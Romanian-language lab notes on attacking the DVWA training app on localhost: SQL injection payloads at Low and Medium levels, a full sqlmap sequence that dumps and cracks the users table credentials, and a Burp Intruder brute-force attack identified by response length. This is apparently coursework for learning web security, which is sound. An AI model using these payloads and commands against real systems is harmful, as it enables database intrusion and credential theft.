1 SQL Injection (Low vs. Medium cu Burp Suite)

Vulnerabilitatea apare când datele introduse de utilizator sunt concatenate direct în șirul SQL fără filtrare sau parametrizare.

Laboratorul 2: Nivel Low (GET)

Interogare: WHERE user_id = '$id';
• Determinare coloane: ' ORDER BY 2 #
• Extragere tabele: %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
• Extragere coloane: %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users'#

Laboratorul 6: Nivel Medium (POST)

Interogare: WHERE user_id = $id;
• Formularul din browser folosește dropdown <select>.
• Se interceptează cererea POST în Burp Proxy.
• Capcană: Nu se folosesc ghilimele!
• Payload: id=1 OR 1=1 UNION SELECT user, password FROM users&Submit=Submit.

2 Laboratorul 4: Blind SQL Injection & Automatizare sqlmap

Când aplicația nu returnează erori sau date din baza de date, se utilizează inferența binară (Boolean-based) sau întârzierile temporale (Time-based cu SLEEP(5)).

Secvența Oficială de Comenzi sqlmap:
# 1. Detectare Baze de Date (folosind cookie-ul Tamper Data)
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit" \
       --cookie="security=low; PHPSESSID=kt1cvnj6cv9s59g4hd4s915j7k" --dbs

# 2. Extragere tabele din baza de date dvwa
sqlmap -u "..." --cookie="..." -D dvwa --tables

# 3. Extragere coloane din tabela users
sqlmap -u "..." --cookie="..." -D dvwa -T users --columns

# 4. Dump complet credențiale și spargere hash-uri
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump

3 Laboratorul 5: Atacul Brute Force & Burp Suite Intruder

Atacul este de tip Cluster Bomb pe două poziții de payload: username=§test§&password=§123§.

Identificarea Succesului după Coloana Length:

• Cereri eșuate: Length = 4554 octeți (mesaj standard "Username and/or password incorrect").
• Cerere corectă (admin:password): Length = 4738 / 4597 octeți (semnalizează afișarea zonei autentificate).
